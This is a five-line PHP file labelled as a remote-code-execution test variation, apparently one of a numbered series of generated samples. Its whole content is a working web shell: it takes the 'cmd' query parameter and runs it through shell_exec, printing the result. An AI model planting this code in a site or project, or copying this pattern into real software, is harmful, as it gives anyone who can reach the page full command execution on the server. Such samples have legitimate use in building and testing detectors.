<?php
// RCE test variation #1008
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>